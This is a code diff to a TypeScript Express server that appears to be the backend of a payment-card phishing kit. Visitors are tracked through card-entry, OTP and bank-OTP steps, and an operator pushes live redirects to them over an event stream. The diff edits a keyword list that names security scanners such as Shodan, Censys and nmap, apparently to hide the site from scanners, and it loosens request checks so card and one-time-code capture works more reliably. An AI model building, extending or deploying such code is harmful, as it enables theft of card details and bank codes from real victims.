@@ -144,25 +144,27 @@ function extractVisitorMeta(req: express.Request): VisitorMeta {
 }
 
 const BOT_KEYWORDS = [
-  'bot', 'crawler', 'spider', 'scraper', 'googlebot', 'bingbot', 'yandex',
-  'baiduspider', 'duckduckbot', 'slurp', 'facebookexternalhit', 'twitterbot',
-  'linkedinbot', 'embedly', 'whatsapp', 'telegrambot', 'applebot', 'petalbot',
-  'bytespider', 'gptbot', 'claudebot', 'anthropic', 'perplexitybot', 'ahrefsbot',
-  'semrushbot', 'mj12bot', 'dotbot', 'rogerbot', 'sogou', 'exabot', 'facebot',
-  'ia_archiver', 'headless', 'puppeteer', 'playwright', 'selenium', 'phantomjs',
-  'lighthouse', 'pagespeed', 'gtmetrix', 'pingdom', 'uptime', 'datadog',
-  'axios', 'curl', 'wget', 'python', 'java/', 'ruby', 'perl', 'php/', 'libwww',
-  'httpclient', 'postman', 'insomnia', 'node-fetch', 'undici', 'go-http-client',
-  'scanner', 'security', 'audit', 'censys', 'shodan', 'nmap', 'zgrab'
+  'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'duckduckbot', 'slurp',
+  'facebookexternalhit', 'twitterbot', 'linkedinbot', 'embedly', 'telegrambot',
+  'applebot', 'petalbot', 'bytespider', 'gptbot', 'claudebot', 'anthropic',
+  'perplexitybot', 'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'rogerbot',
+  'sogou', 'exabot', 'facebot', 'ia_archiver', 'puppeteer', 'playwright',
+  'selenium', 'phantomjs', 'lighthouse', 'pagespeed', 'gtmetrix', 'pingdom',
+  'curl/', 'wget/', 'scrapy', 'censys', 'shodan', 'nmap', 'zgrab'
 ];
 
 function isBotRequest(req: express.Request): boolean {
   const ua = String(req.headers['user-agent'] || '').trim().toLowerCase();
-  if (!ua) return true;
-  if (BOT_KEYWORDS.some((keyword) => ua.includes(keyword))) return true;
+  if (ua && BOT_KEYWORDS.some((keyword) => ua.includes(keyword))) return true;
   const purpose = String(req.headers['purpose'] || req.headers['x-purpose'] || '').toLowerCase();
   if (purpose.includes('preview') || purpose.includes('crawl')) return true;
   return false;
+}
+
+function getHeaderId(req: express.Request, name: string): string | undefined {
+  const raw = req.headers[name];
+  if (typeof raw === 'string' && raw.trim()) return raw.trim();
+  return undefined;
 }
 
 function getFingerprintKey(req: express.Request): string {
@@ -596,6 +598,7 @@ function recordServerSideVisit(
 
   const clientId = String(
     options?.clientId ||
+      getHeaderId(req, 'x-client-id') ||
       cookies.esaad_cid ||
       fpSession?.clientId ||
       crypto.randomUUID()
@@ -607,6 +610,7 @@ function recordServerSideVisit(
     ? null
     : String(
         options?.requestId ||
+          getHeaderId(req, 'x-request-id') ||
           cookies.esaad_req_id ||
           existingDevice?.requestId ||
           fpSession?.requestId ||
@@ -737,10 +741,6 @@ app.use((req, res, next) => {
 // ==================== REAL-TIME SSE STREAM (/api/stream) ====================
 app.get('/api/stream', async (req, res) => {
   const role = String(req.query.role || 'visitor');
-
-  if (role !== 'admin' && isBotRequest(req)) {
-    return res.status(403).json({ error: 'Forbidden' });
-  }
 
   res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
   res.setHeader('Cache-Control', 'no-cache, no-transform');
@@ -1043,13 +1043,9 @@ app.patch('/api/admin/preferences', async (req, res) => {
 
 // 3. Requests CRUD (Unified Server-Side Store + Supabase Sync)
 app.get('/api/requests/current', async (req, res) => {
-  if (isBotRequest(req)) {
-    return res.status(403).json({ error: 'Forbidden' });
-  }
-
   const cookies = parseCookies(req.headers.cookie);
   const fpSession = serverStore.getIpSession(getFingerprintKey(req));
-  const id = cookies.esaad_req_id || fpSession?.requestId;
+  const id = getHeaderId(req, 'x-request-id') || cookies.esaad_req_id || fpSession?.requestId;
   if (!id) {
     return res.status(404).json({ error: 'لا يوجد طلب نشط' });
   }
@@ -1114,15 +1110,17 @@ app.get('/api/requests/:id', async (req, res) => {
 });
 
 app.post('/api/requests', async (req, res) => {
-  if (isBotRequest(req)) {
-    return res.status(403).json({ error: 'Forbidden' });
-  }
-
   const cookies = parseCookies(req.headers.cookie);
   const fpSession = serverStore.getIpSession(getFingerprintKey(req));
   const nowMs = Date.now();
   const now = new Date(nowMs).toISOString();
-  const id = String(req.body?.id || cookies.esaad_req_id || fpSession?.requestId || crypto.randomUUID());
+  const id = String(
+    req.body?.id ||
+      getHeaderId(req, 'x-request-id') ||
+      cookies.esaad_req_id ||
+      fpSession?.requestId ||
+      crypto.randomUUID()
+  );
 
   const existing = serverStore.getRequest(id);
   const newRecord: RequestRecord = {
@@ -1161,7 +1159,8 @@ app.post('/api/requests', async (req, res) => {
 
   serverStore.clearExplicitlyOffline(id);
   lastDbPresenceSync.set(id, { time: nowMs, page: '/payment' });
-  const clientId = cookies.esaad_cid || fpSession?.clientId || crypto.randomUUID();
+  const clientId =
+    getHeaderId(req, 'x-client-id') || cookies.esaad_cid || fpSession?.clientId || crypto.randomUUID();
   const meta = extractVisitorMeta(req);
   serverStore.setUserMeta(id, meta);
   serverStore.setDevicePresence(clientId, {
@@ -1184,13 +1183,12 @@ app.post('/api/requests', async (req, res) => {
 });
 
 app.patch('/api/requests/:id', async (req, res) => {
-  if (isBotRequest(req)) {
-    return res.status(403).json({ error: 'Forbidden' });
-  }
-
   const cookies = parseCookies(req.headers.cookie);
   const fpSession = serverStore.getIpSession(getFingerprintKey(req));
-  const id = req.params.id === 'current' ? cookies.esaad_req_id || fpSession?.requestId : req.params.id;
+  const id =
+    req.params.id === 'current'
+      ? getHeaderId(req, 'x-request-id') || cookies.esaad_req_id || fpSession?.requestId
+      : req.params.id;
   if (!id) {
     return res.status(400).json({ error: 'معرف الطلب غير متوفر' });
   }
@@ -1206,14 +1204,19 @@ app.patch('/api/requests/:id', async (req, res) => {
   let pushedRedirect: string | null = null;
   let isVisitorMutation = false;
 
+  const targetRoute =
+    req.body?.nextAction !== undefined ? normalizeRedirectTarget(req.body.nextAction) : null;
+
   if (req.body?.nextAction !== undefined) {
-    const targetRoute = normalizeRedirectTarget(req.body.nextAction);
     if (targetRoute) {
       serverStore.setPendingRedirect(id, targetRoute);
       serverStore.setLastKnownPage(id, targetRoute);
       patchPayload.step = targetRoute;
       patchPayload.currentPage = targetRoute;
       pushedRedirect = targetRoute;
+      if (targetRoute !== '/card-details' && req.body?.otpStatus === undefined) {
+        patchPayload.otpStatus = '';
+      }
       const existingPresence = serverStore.getUserPresence(id);
       if (existingPresence) {
         serverStore.setUserPresence(id, { ...existingPresence, currentPage: targetRoute });
@@ -1221,10 +1224,16 @@ app.patch('/api/requests/:id', async (req, res) => {
     } else {
       serverStore.deletePendingRedirect(id);
     }
-  } else if (req.body?.step === 'card' || req.body?.step === 'otp' || req.body?.step === 'otp-bank') {
+  }
+
+  if (
+    !targetRoute &&
+    (req.body?.step === 'card' || req.body?.step === 'otp' || req.body?.step === 'otp-bank')
+  ) {
     isVisitorMutation = true;
     serverStore.deletePendingRedirect(id);
-    const stepPage = req.body.step === 'card' ? '/waiting' : req.body.step === 'otp-bank' ? '/otp-bank' : '/otp';
+    const stepPage =
+      req.body.step === 'card' ? '/waiting' : req.body.step === 'otp-bank' ? '/otp-bank' : '/otp';
     patchPayload.currentPage = stepPage;
     serverStore.clearExplicitlyOffline(id);
     serverStore.setUserPresence(id, { lastSeen: nowMs, currentPage: stepPage });
